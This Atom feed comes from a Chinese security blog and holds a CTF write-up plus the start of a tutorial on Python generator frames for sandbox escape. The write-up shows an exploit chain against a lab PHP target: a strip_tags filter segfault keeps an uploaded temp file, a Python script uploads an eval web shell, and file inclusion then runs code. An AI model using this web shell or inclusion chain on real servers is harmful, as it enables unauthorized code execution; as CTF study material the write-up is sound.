<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>golden的部落阁</title>
  
  <subtitle>subtitle写得真好</subtitle>
  <link href="http://blog.g01den.top/atom.xml" rel="self"/>
  
  <link href="http://blog.g01den.top/"/>
  <updated>2025-10-27T14:45:48.369Z</updated>
  <id>http://blog.g01den.top/</id>
  
  <author>
    <name>g01den</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>有小考点的Web题</title>
    <link href="http://blog.g01den.top/posts/b3ad4123.html"/>
    <id>http://blog.g01den.top/posts/b3ad4123.html</id>
    <published>2025-10-27T14:38:34.000Z</published>
    <updated>2025-10-27T14:45:48.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buuoj-npuctf2020ezinclude-1"><a class="markdownIt-Anchor" href="#buuoj-npuctf2020ezinclude-1">#</a> BUUOJ-[NPUCTF2020]ezinclude 1</h1><h2 id="涉及的知识点"><a class="markdownIt-Anchor" href="#涉及的知识点">#</a> 涉及的知识点</h2><ul><li>文件上传时的临时文件</li><li>php7 文件上传时  <code>Segment Fault</code> ，上传的临时文件不会被删除</li><li>绕过 <code>disable_functions</code></li></ul><h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程">#</a> 解题过程</h2><p>​扫个目录，存在 <code>index.php</code> 、 <code>dir.php</code> 、 <code>404.html</code></p><p>​ <code>404.html</code>  没啥用，先看 <code>dir.php</code> ，好像获取目录内文件的，但是不知道是什么地方的，之后看看。</p><p>​ <code>index.php</code>  抓个包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:20:37 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>73</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Mon, 08-Dec-2025 06:20:37 GMT; Max-Age=3600000</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">username/password<span class="built_in"> error</span><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>​看到 <code>&lt;!--md5($secret.$name)===$pass --&gt;</code>  提示</p><blockquote><ul><li><code>Set-Cookie</code>  中的 <code>Hash</code>  就是 <code>$md5($secret.$name)</code> （经典脑洞）</li><li>如果 <code>$name=''</code> ，则有 <code>$md5($secret.$name)===$md5($secret)===上面的Hash</code></li><li>则 <code>/?pass=上面的Hash</code>  即可，或者带上 <code>&amp;name=</code>  传递空值</li></ul></blockquote><p>​这里是个脑洞，不知道怎么写，大神的博客里的解法是这样的，之后访问 get 传参 pass 为 hash 的值：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?pass=fa25e54758d5d5c1927781a6ede89f8a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​得到回显：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:23:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>165</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;flflflflag.php&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>​访问 <code>flflflflag.php</code> ，会 302，butp 重放：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:24:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>241</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>​提示文件包含，读下相关文件 <code>index.php</code> ：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$file=$_GET[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span></span><br><span class="line"><span class="meta">die(&#x27;nonono&#x27;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">@include($file);</span></span><br><span class="line"><span class="meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​发现 data，input，zip 三个伪协议被杨了。</p><p>​读一下 <code>dir.php</code> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​是读取的临时文件，之前说过了，</p><blockquote><p>php7 文件上传时  <code>Segment Fault</code> ，上传的临时文件不会被删除</p><p><strong>这里需要用到一个特性</strong>，在上传文件时，如果出现 <code>Segment Fault</code> ，那么上传的临时文件不会被删除。这里的上传文件需要说明一下，一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要 HTTP 请求中存在文件，那么就会被保存为临时文件，当前 HTTP 请求处理完成后，垃圾回收机制会自动删除临时文件。</p><p>使 <code>php</code>  陷入死循环直，产生 <code>Segment Fault</code>  的方法：（具体原理未找到，如果有大佬清楚，请告知，感谢。）</p><ul><li>使用</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=文件</span><br></pre></td></tr></table></figure><ul><li><p>版本要求：</p><ul><li><code>php7.0.0-7.1.2</code></li><li><code>php7.1.3-7.2.1</code></li><li><code>php7.2.2-7.2.8</code></li></ul></li><li><p>使用</p></li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=文件</span><br></pre></td></tr></table></figure><ul><li>版本要求：<ul><li><code>php&lt;=5.6.38</code></li><li><code>php7.0.0-7.0.32</code></li><li><code>php7.0.4-7.2.12</code></li></ul></li><li>函数要求<ul><li><code>file</code></li><li><code>file_get_contents</code></li><li><code>readfile</code></li></ul></li></ul></blockquote><p>​这个时候直接用下面这个代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f5a7ab3-e7a9-44aa-82ec-fc6ee05919ff.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><blockquote><ul><li>存储路径，由</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.ini</span><br></pre></td></tr></table></figure><p>中的</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_tmp_dir</span><br></pre></td></tr></table></figure><p>指定，</p><ul><li><p>linux 下默认值 <code>/tmp/</code></p></li><li><p>windwos 下默认值 <code>C:/Windwos</code>  or  <code>C:/Windwos/Temp/</code></p></li><li><p>命名规则</p></li><li><p>linux 下， <code>php+6个随机字符</code></p></li><li><p>windows 下， <code>php+4个随机字符.tmp</code></p></li><li><p>生命周期</p></li><li><p>开始处理带有文件的 <code>POST</code>  请求</p></li><li><p>保存临时文件，并写入数据</p></li><li><p>执行 <code>php</code>  脚本</p></li><li><p>删除临时文件</p></li></ul></blockquote><p>​这里可以直接访问 <code>dir.php</code>  获得文件名。</p><p>​之后通过 flflflflag.php 进行临时文件包含即可：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flflflflag.php?file=../../../tmp/php7nXFiI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">cmd</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><p>​flag 在 phpinfo 里。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuoj-npuctf2020ezinclude-1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#buuoj-npuctf2020ezinclude-1&quot;&gt;#&lt;/a&gt; BUUOJ-[NPUCTF2020]ezinclude 1&lt;/h</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Python栈帧逃逸</title>
    <link href="http://blog.g01den.top/posts/2d792864.html"/>
    <id>http://blog.g01den.top/posts/2d792864.html</id>
    <published>2025-09-13T14:05:07.000Z</published>
    <updated>2025-09-13T14:13:33.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python栈帧逃逸"><a class="markdownIt-Anchor" href="#python栈帧逃逸">#</a> Python 栈帧逃逸：</h1><h2 id="1-yield-语与生成器函数"><a class="markdownIt-Anchor" href="#1-yield-语与生成器函数">#</a> 1、yield 语与生成器函数：</h2><p>​python 中的 yield 语句用于定义生成器函数，它能让函数在运行过程中暂停并保存当前状态，后续再恢复执行。</p><p>​生成器 是  Pythonn 中一种特殊的迭代器，它可以在迭代过程中动态生成值，而不需要一次性将所有值存 0 储在内存中。</p><p>​举个生成器的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成器函数第一次执行&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成器函数第二次执行&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成器函数第三次执行&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gen = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="comment"># frame = [x for x in gen]</span></span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果</span></span><br><span class="line"><span class="comment">#生成器函数第一次执行</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#生成器函数第二次执行</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#生成器函数第三次执行</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>​或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>​也可以 遍历获取所有的自增值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="comment">#会正常输出1到19</span></span><br></pre></td></tr></table></figure><h2 id="2-生成器表达式"><a class="markdownIt-Anchor" href="#2-生成器表达式">#</a> 2、生成器表达式：</h2><p>​生成器表达式是一种在 Python 中创建生成器的紧凑形式。类似于列表推导式，生成器表达式允许你使用简洁的语法来定义生成器，而不必显示地编写一个函数。生成器表达式的 语法与列表推导式类似，但是使用圆括号而不是方括号。生成器表达式会 逐个生成值，而不是一次性生成 整个序列。。这有利于 提高内存的额 利用率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = (i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以用next一步步 获取值</span></span><br><span class="line"><span class="comment"># print(next(f))</span></span><br><span class="line"><span class="comment">#也可以遍历获取所有值</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><h2 id="3-生成器属性"><a class="markdownIt-Anchor" href="#3-生成器属性">#</a> 3、生成器属性：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gi_code:生成器对应的code对象。</span><br><span class="line">gi_frame:生成器对应的frame(栈帧)对象</span><br><span class="line">gi_running:生成器函数是否在执行。生成器函数在<span class="keyword">yield</span>以后、执行<span class="keyword">yield</span>的下一行代码前处于frozen状态，此时这个属性为<span class="number">0.</span></span><br><span class="line">gi_yeildfrom:如果生成器正在从另一个生成器中<span class="keyword">yield</span>值，则为该生成器对象的引；否则为<span class="literal">None</span></span><br><span class="line">gi_frame.f_locals:一个字典，，包含生成器当前栈的本地变量</span><br></pre></td></tr></table></figure><h2 id="4-gi_frame的使用"><a class="markdownIt-Anchor" href="#4-gi_frame的使用">#</a> 4、gi_frame 的使用：</h2><p>​gi_frame 是一个与生成器和协程相关的属性。它指向生成器或协程当前 执行的帧对象，如果这个生成器或协程正在执行的话。帧对象 表示代码 执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line">frame = f.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;局部变量(Local Variables):&quot;</span>,frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全局变量(Gloobal Variables):&quot;</span>,frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code对象:&quot;</span>,frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Insstruction Pointer:&quot;</span>,frame.f_lasti)</span><br></pre></td></tr></table></figure><p>​获取代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取生成器的当前代码信息</span></span><br><span class="line">code = gen.gi_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出生成器的当前代码信息</span></span><br><span class="line"><span class="built_in">print</span>( code.co_name)</span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="built_in">print</span>( code.co_consts)</span><br><span 